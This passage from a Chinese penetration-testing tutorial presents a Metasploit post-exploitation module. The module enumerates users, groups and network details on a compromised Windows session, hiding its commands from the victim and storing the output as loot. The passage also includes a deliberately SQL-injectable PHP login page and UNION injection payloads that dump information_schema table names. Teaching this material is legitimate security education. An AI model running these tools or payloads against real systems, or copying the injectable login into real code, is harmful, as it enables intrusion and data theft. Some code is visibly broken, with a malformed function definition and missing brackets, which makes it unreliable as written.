
这看起来与我们的 exploit 模块的开头非常相似。我们包含了一系列 Mix-Ins，它们允许我们与注册表、账户和 WMIC 交互。我们在 `initialize` 函数中包含了标准信息，但注意这里我们不需要设置任何关于 payload 的内容，因为没有 payload。我们还有一段代码注册选项。在这种情况下，我们创建了一个名为 `INFO` 的字符串，用户可以在其中设置他们想要检索的值。我们可以输入 U 代表用户，G 代表组，或 N 代表网络，或者之前这些值的任何组合，以便一次性中检索多项数据。

接下来，我们正在创建三个函数：`get_users`、`get_group` 和 `get_net`。这些函数允许我们将与每个区域相关的代码放在自己的函数中，以便我们在需要时可以将它们复制到其他地方，并且更方便地跟踪发生的情况。让我们先看 `get_users` 函数。

```ruby
def get_users()
    users = []
    data = wmic_query('account list brief /FORMAT:csv').split("\n")
    # 从 WMIC 输出中提取域名和 sid，在线状态
    data[2..-1].each do |line|
        tmp = line.rstrip().split(',')
        userinfo = [tmp[0], tmp[5], tmp[6]]
        userinfo << registry_key_exist?("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\#{userinfo[2]}")
        users << userinfo
    end
    # 生成一个输出表格
    tbl = Rex::Ui::Table.new(
        'Header' => 'System Users',
        'Indent' => 1,
        'Columns' => %w(Username SID Profile))
    users.each do |user|
        tbl << user
    end
    print_line("\n" + tbl.to_s + "\n")
    store_loot('host.users', '/text/plain', session, tbl.to_s, 'System Users')
end
```

我们的 `get_users` 函数首先定义了一个名为 `users` 的数组。我们使用 `wmic` 获取信息，但我们需要用户名、SID 以及注册表列表是否存在。`userinfo` 数组存储了这些值。我们生成一个输出表格并打印。

```ruby
def get_group()
    groups = []
    data = wmic_query('group list brief /FORMAT:csv').split("\n")
    data[3..-1].each do |line|
        line.rstrip!
        info = line.split(',')[3..-1]
        groups << info
    end
    tbl = Rex::Ui::Table.new(
        'Header' => 'System Groups',
        'Indent' => 1,
        'Columns' => %w(Name SID Members))
    print_status('Dumping groups.. please wait')
    groups.each do |group|
        p = session.sys.process.execute("cmd /c net localgroup #{group[0]}", nil, 'Hidden' => true, 'Channelized' => true)
        out = data = ''
        while (data = p.channel.read)
            out << data
        end
        p.channel.close
        valid = out.split("\r\n")[6..-2]
        group[2] = ''
        group[2] = valid.join(',') unless valid.empty?
        tbl << [group[1], group[0], group[2]]
    end
    print_line("\n" + tbl.to_s + "\n")
    store_loot('host.groups', '/text/plain', session, tbl.to_s, 'System Groups')
end
```

打印状态消息以告知用户我们正在转储组数据，然后开始转储各个组的成员关系。

对于每个组，我们都对该组执行 `net localgroup <username>`。我们使用会话 `session` 对象来执行命令。注意，我们既隐藏了命令，使其不会显示在受害者的桌面上，又通过通道化处理输出，这样我们可以轻松地获取输出文本。命令运行后，我们检索数据，然后关闭会话和进程。

然后，我们必须清理命令的输出，因为它包含大量的表头和其他信息。因此，我们将删掉前六行和最后一行。这将只带给我们该组的用户列表。只要 `net localgroup` 命令的输出不为空，我们就将此列表追加到组数组的第三字段中。

最后，我们添加表格信息，将其打印出来并保存为战利品 `loot`。我们将确保数据保持持久化，以防我们以后需要回来查看，并将其存储在数据库中。

我们需要的最后一组数据是网络信息。遗憾的是，其中许多内容并不存在于 WMI 中，而是我们必须运行命令。我们将使用在组函数中使用的相同命令技术来获取数据，但我们必须执行更多的命令来获取所需的数据。

```ruby
def get_net netcmds = [
  ['ipconfig', 'ipconfig /all'],
  ['route', 'route print'],
  ['arp', 'arp -a'],
  ['netstat', 'netstat -ano'],
  ['tasklist', 'tasklist /V']
]
netcmds.each do |cmd|
print_status("Running #{cmd[1]}")
p = session.sys.process.execute("cmd /c #{cmd[1]}", nil,
'Hidden' => true,
'Channelized' => true
out = ''
while (data = p.channel.read)
out << data
```

```ruby
p.channel.close
p.close
store_loot("host.#{cmd[0]}", 'text/plain', session, out, "{cmd[0]}.txt", "#{cmd[0]} data")
print_status(out)
end
end
```

我们在开始函数时，指定一个命令名称数组和我们想要运行的命令。这将更容易存储各个输出。对于我们要执行的每个命令，我们都会遍历并告诉用户我们正在运行哪个命令以供调试，然后执行该命令，最后将每个命令及其输出保存到各自自己的战利品文件中。这意味着当我们在运行脚本时执行 `ls ~/.msf5/loot/` 时，我们将看到许多包含我们输出的文件。

我们要做的最后一件事是指定我们的运行函数 `run function`。运行函数是告诉脚本做什么的。我们需要处理选项检查，然后调用我们创建的函数。

```ruby
def run
    print_status("Running against session #{datastore['SESSION']}")
    unless datastore['INFO']
        print_error("Please set INFO to U, G, or N for User, Group Network or UGN for all three")
        return
    end
    get_users if datastore['INFO'] =~ /U/i
    get_group if datastore['INFO'] =~ /G/i
    get_net if datastore['INFO'] =~ /N/i
```

当代码运行时，它将打印出正在运行的会话号。然后它会检查 `INFO` 变量是否为空，如果为空，它将打印用法信息并退出。如果 `INFO` 存在，它将为三种可能的组合中的每一种运行函数，然后结束执行。这是我们脚本中最简单的部分，因为它只是处理工作流，而没有实际上提取任何特定数据。

### PHP 登录脚本示例

```php
if ($_POST['login'] && $_POST['pass'])
{
  $c = mysql_connect('localhost','testapp','test123');
  $q = mysql_query("select * from testapp.login where login = '{$_POST['login']}' and pass = '{$_POST['pass']}'");
```
```php
?>
<FORM METHOD=POST>
Login:<INPUT TYPE=TEXT NAME=login><BR>
Pass:<INPUT TYPE=PASSWORD NAME=pass><BR>
<INPUT TYPE=SUBMIT VALUE="Login!"><BR>
</FORM>
```

此脚本的 PHP 代码首先创建一个会话，以便在 `$_SESSION` 数组中跟踪用户信息，这些信息将在跨页面查看时持久化。如果通过 POST 方法提交了数据，脚本将检查并验证 `login` 和 `pass` 变量是否已提交。如果没有提交，脚本将无法检查数据库中的用户名和密码是否匹配。接下来，脚本使用我们将稍后创建的凭据连接到 MySQL 数据库。现在脚本已经连接到数据库，是时候在数据库中搜索用户提交的输入内容了。

正在执行的查询旨在从数据库获取所有记录，其中数据库中的 `login` 字段包含通过提交表单中的 `login` 字段发送的信息，且 `pass` 字段与密码字段匹配。每条数据都封装在单引号字符中。只要输入内容不包含单引号，这种方法就能生效。如果输入中包含单引号，那么结束被搜索数据的单引号将被正确关闭，提交字符串的其余部分将作为查询的一部分被执行。查询返回信息，表单在会话中设置身份验证标记，并将用户引导至搜索页面。让我们完成数据库的设置以便我们可以进行测试。我们将创建一个名为 `addsql.sql` 的文件并添加以下文本：

```sql
create database if not exists testapp;
grant all privileges on testapp.* to testapp@localhost
identified by 'test123';
create table if not exists testapp.login (login varchar(10),
pass varchar(10));
insert into testapp.login values ('admin','admin123');
create table if not exists testapp.wordlist (word varchar(25));
insert into testapp.wordlist values ('this'), ('that'),
('now'), ('happy'), ('sad'), ('coding'), ('for'), ('pentesters'),
('ruby'), ('python');
```

为了为我们的脚本设置数据库，我们需要创建数据库并输入示例数据。先前的 SQL 脚本创建了 `testapp` 数据库，然后将该数据库的权限授予了密码为 `test123` 的 `testapp` 用户。接下来，它创建了一个包含 `login` 和 `pass` 两个变量的 `login` 表。一旦创建了表，就会包含一个登录名为 `admin` 密码为 `admin123` 的超机密密码的第一个条登录信息。现在身份验证值已经设置好，我们将在下一个示例中想要提取一些数据，因此我们将先创建一个表来存储单词列表，并将这些单词插入到 `wordlist` 表中。

我们需要将 SQL 脚本导入数据库。通过将这些查询保存到文件中，本例中为 `addsql.sql`，我们可以通过单条命令运行这些查询。通过将这些命令保存到文件中，我们还获得了额外的优势：可以使用文本编辑器构建命令，而不是使用 MySQL Shell，而且如果我们需要再次执行这些命令，就不需要重新记住它们。当我们执行命令 `mysql -u root < addsql.sql` 时，`mysql` 客户端将从我们创建的 `addsql.sql` 文件获取输入并在服务器上运行。`-u` 是我们想要使用的用户名。我们使用 `<` 符号表示我们将从文件作为标准输入向应用程序发送数据。通过重定向，我们不需要逐个输入每个命令。

### information_schema 利用

从 MySQL 5 版本开始，引入了 `information_schema` 数据库。这个数据库是一个元数据库，包含了 MySQL 数据库中所有元素的信息。我们可以查询 `information_schema` 来查找我们有权访问数据库的任何信息。我们已经见过了要利用的应用程序代码，但假设我们没见过，我们就不知道登录表的名称。通过使用 `information_schema` 数据库，我们可以找到这些信息。

我们正在利用的查询看起来如下：
`select from wordlist where word like '%${POST['word']}'`

我们真正需要做的是将这个查询修改为能够显示来自 `information_schema` 数据库信息的查询。数据库中有一个表，包含了关于我们可以访问的所有表的信息。这个表被称为 `TABLES`，它包含了关于我们可以访问的数据库和表的所有元数据，包括表所在的数据库以及表本身的名称。我们将构建一个查询来强制 `select` 语句返回这些信息。其中，我们的输出只打印了返回数据的第一个元素。我们需要两个部分且只有一个字段来存放它们，因此我们必须进行一些额外的魔法操作，将字段中的数据合并为一个，以便正确输出。

我们并不太关心 `wordlist` 表中的数据，因此我们修改查询，使其不返回任何此类信息，只返回我们想要的信息。我们对单词 `qqqq` 进行普通搜索。它没有返回结果，因此这是确保不返回任何 `wordlist` 数据的一种好方法。我们将使用 `UNION` 语句将两个查询合并，并同时返回它们的输出。在执行 SQL 注入时，`UNION` 关键字非常重要，因为它允许我们从通常在查询中无法访问的表中返回额外信息。让我们使用 `UNION` 语句开始从 `information_schema` 数据库获取信息。

我们发布查询：
`qqqq' union select TABLE_NAME from information_schema.TABLES --`

我们看到了所有我们可以访问的表的输出。问题是，其中许多表本身就是 `information_schema` 数据库的表。我们并不在乎这些，所以扩展我们的查询，使其只返回不在 `information_schema` 数据库中的表名。

```
qqqq union select TABLE_NAME from information_schema.TABLES WHERE TABLE_SCHEMA != 'information_schema' -
```

现在，我们只看到感兴趣的表。

然而，除了表名之外，知道数据库名称通常也很方便，但我们修改了查询，以便在一个字段中同时看到两者。为了将多个部分的信息合并到一个字段中，我们可以使用 MySQL 的 `CONCAT` 指令，将所有信息连接成单个字符串。我们再次修改查询。

```
qqqq union select CONCAT(TABLE_SCHEMA,'|',TABLE_NAME) from information_schema.TABLES WHERE TABLE_SCHEMA != 'information_schema'
```
